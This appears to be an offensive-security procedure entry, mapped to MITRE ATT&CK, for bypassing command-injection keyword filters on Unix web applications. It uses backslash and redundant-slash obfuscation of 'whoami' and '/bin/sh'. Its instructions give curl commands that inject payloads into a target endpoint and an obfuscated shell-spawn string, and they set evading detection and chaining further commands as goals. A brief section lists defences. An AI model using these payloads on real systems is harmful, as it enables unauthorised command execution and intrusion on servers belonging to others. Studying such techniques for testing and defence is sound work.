---
id: daf3360d-d3ce-4f27-90ec-4bff0addb94f
name: Command-Injection-Filter-Bypass-with-Backslash-and-Slash
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:57.308819+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/Unix Shell|T1059.004 - Unix Shell]]'
tags:
  - '[[tags/Bypass Blacklisted words]]'
  - '[[tags/Bypass with backslash and slash]]'
  - '[[tags/Command Injection]]'
  - '[[tags/Filter Bypasses]]'
  - command-injection
  - filter-bypass
  - obfuscation
commands:
  - '[[commands/curl-send-injection-payload]]'
platforms:
  - Linux
  - Web
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Command-Injection-Filter-Bypass-with-Backslash-and-Slash

## Summary

This procedure outlines how to bypass input filters designed to block common command injection payloads by using backslash and slash obfuscation techniques. It enables the execution of arbitrary Unix shell commands on a vulnerable web application, such as displaying the current user with 'whoami' or spawning a '/bin/sh' shell, while evading keyword-based blacklists.

## Description

Command injection vulnerabilities occur when user input is passed unsanitized to system shell commands, allowing attackers to append or modify commands. Filters often block direct usage of keywords like 'whoami' or '/bin/sh' to prevent abuse. This procedure uses character obfuscation with backslashes (\) to escape and split blocked terms, combined with redundant slashes (/////) to confuse simple regex filters. The technique targets Unix-based backends and is useful in web applications where input is executed via functions like system() or exec(). Success relies on the filter's inability to normalize escaped or redundant characters, leading to command execution and potential remote code execution (RCE). This maps to MITRE ATT&CK T1059.004 for Unix Shell execution in offensive operations.

## Requirements

1. Network access to a web application vulnerable to command injection (e.g., an input field that executes shell commands without proper sanitization).
2. Knowledge of the application's injection point (e.g., a search parameter or file upload field).
3. Tools for sending HTTP requests, such as curl or [[tools/Burp-Suite]] for interception and modification.
4. A Unix-based target backend (e.g., Linux server running PHP, Python, or similar with shell access).
5. Basic understanding of HTTP requests and URL encoding for payload delivery.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization, using whitelisting instead of blacklisting keywords, and normalize inputs to remove escapes/redundancies (e.g., via libraries like OWASP ESAPI).
- Deploy a web application firewall (WAF) configured to detect obfuscated injection patterns, such as excessive backslashes or slashes in inputs.
- Use least privilege principles: Run web processes in isolated environments (e.g., containers) without shell access, and log all system() or exec() calls for anomaly detection.
- Enable application logging for command executions and monitor for unexpected outputs like user enumeration or shell spawns.

## Objectives

1. Identify and confirm a command injection vulnerability in the target application.
2. Craft and inject an obfuscated payload to bypass filters and execute reconnaissance commands.
3. Achieve arbitrary command execution, such as user discovery or shell access, to facilitate further exploitation.
4. Evade detection by avoiding direct blocked keywords.

## Instructions

### Step 1: Identify the Injection Point

**Context**: Locate a user-controlled input that is executed in a shell context, such as a ping utility or system diagnostic field. Test for basic injection by appending simple commands like '; id' to see if output reflects execution.

**Command** ([[commands/curl-send-injection-payload]]):
```bash
curl -X POST "http://target.com/vulnerable-endpoint" -d "input=; id" -v
```

> This sends a basic test payload to check for injection. If the response includes output from 'id' (e.g., uid=33(www-data)), the endpoint is vulnerable. If blocked, proceed to obfuscation. Expected output: HTTP response body containing shell command results or errors indicating execution.

### Step 2: Craft the Obfuscated Payload

**Context**: Use the obfuscated code snippet to split blocked commands. For example, 'whoami' becomes 'w\ho\am\i' to evade filters checking for the full string, and '/bin/sh' becomes '/\b\i\n/////s\h' with redundant slashes to bypass path normalization.

**Code** ([[codes/Bash-Command-Injection-Bypass-Backslash-Slash]]):
```bash
w\ho\am\i
/\b\i\n/////s\h
```

> Embed this in the injection point, e.g., as '; w\ho\am\i' or to chain commands. The backslashes escape characters to prevent filter matching, while extra slashes in paths are ignored by the shell. Test in a local environment if possible.

### Step 3: Inject and Execute the Payload

**Context**: Deliver the obfuscated payload via HTTP request to the vulnerable endpoint. Use tools like Burp Suite to intercept, modify, and replay requests, ensuring proper URL encoding if needed (e.g., %5C for \).

**Command** ([[commands/curl-send-injection-payload]]):
```bash
curl -X POST "http://target.com/vulnerable-endpoint" -d "input=; w\ho\am\i" -v
```

> Replace the input with the full obfuscated payload. For shell spawn, use '; /\b\i\n/////s\h'. Monitor the response for command output. If successful, the filter is bypassed, and commands execute as the web server user.

### Step 4: Verify Execution and Escalate

**Context**: Confirm success by checking for expected command outputs. If 'whoami' returns a username (e.g., www-data), the bypass worked. Chain additional commands for escalation, such as downloading tools.

> Expected output in response: Username or shell prompt indicators. If no output, adjust obfuscation (e.g., add more escapes) or check for WAF blocks via response codes (e.g., 403).
